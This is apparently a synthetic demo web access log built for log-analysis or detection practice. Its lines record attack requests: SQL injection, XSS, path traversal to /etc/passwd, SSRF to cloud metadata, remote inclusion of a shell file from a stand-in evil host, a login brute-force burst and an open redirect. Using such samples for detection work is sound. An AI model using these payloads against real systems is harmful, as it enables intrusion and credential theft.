# demo_access.log (combined log format)
192.0.2.10 - - [10/Oct/2025:10:00:00 +0530] "GET /search?q=%27+OR+1%3D1 HTTP/1.1" 200 123 "-" "Mozilla/5.0"
198.51.100.5 - - [10/Oct/2025:10:02:00 +0530] "GET /page?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 234 "-" "curl/7.68.0"
203.0.113.22 - - [10/Oct/2025:10:04:00 +0530] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 512 "-" "Wget/1.20.3"
203.0.113.23 - - [10/Oct/2025:10:06:00 +0530] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 64 "-" "python-requests/2.25.1"
198.51.100.6 - - [10/Oct/2025:10:08:00 +0530] "GET /include?file=http://evil.example.com/shell.txt HTTP/1.1" 200 128 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:00 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0" 
198.51.100.7 - - [10/Oct/2025:10:09:05 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:10 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:15 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:20 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:25 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:30 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:35 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:40 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.7 - - [10/Oct/2025:10:09:45 +0530] "POST /login HTTP/1.1" 401 27 "-" "Mozilla/5.0"
198.51.100.8 - - [10/Oct/2025:10:11:00 +0530] "GET /redirect?to=home&to=http://evil.example.com HTTP/1.1" 302 0 "-" "Mozilla/5.0"
192.0.2.11 - - [10/Oct/2025:10:12:00 +0530] "POST /upload HTTP/1.1" 200 512 "-" "Mozilla/5.0"
